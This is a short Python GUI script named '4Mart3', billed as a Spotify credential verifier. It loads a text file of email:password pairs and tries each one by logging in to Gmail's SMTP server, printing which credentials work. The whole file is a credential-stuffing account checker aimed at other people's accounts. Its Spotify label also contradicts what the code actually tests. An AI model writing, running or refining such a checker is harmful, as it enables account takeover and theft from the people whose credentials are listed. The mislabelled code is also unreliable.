import tkinter as tk
from tkinter import filedialog
import smtplib

def verificar_credenciales(email, password, servicio):
    try:
        if servicio.lower() == "spotify":
            servidor_smtp = smtplib.SMTP("smtp.gmail.com", 587)
            servidor_smtp.starttls()
            servidor_smtp.login(email, password)
            print(f"Las credenciales de Spotify son válidas: {email}:{password}")
            servidor_smtp.quit()
    except smtplib.SMTPAuthenticationError:
        print(f"Las credenciales no son válidas: {email}:{password}")
    except Exception as e:
        print(f"Error al verificar credenciales: {e}")

def buscar_archivo():
    archivo = filedialog.askopenfilename(filetypes=[("Archivos de texto", "*.txt")])
    if archivo:
        with open(archivo, "r") as file:
            for line in file:
                email, password = line.strip().split(":")
                verificar_credenciales(email, password, "spotify")

# Crear la ventana principal y cambiar el nombre del programa
root = tk.Tk()
root.title("4Mart3")

# Crear una etiqueta de bienvenida
etiqueta_bienvenida = tk.Label(root, text="Bienvenido a 4Mart3 - Verificador de Credenciales de Spotify")
etiqueta_bienvenida.pack(pady=20)

# Crear un botón para buscar el archivo
btn_buscar = tk.Button(root, text="Buscar Archivo", command=buscar_archivo)
btn_buscar.pack(pady=10)

root.mainloop()
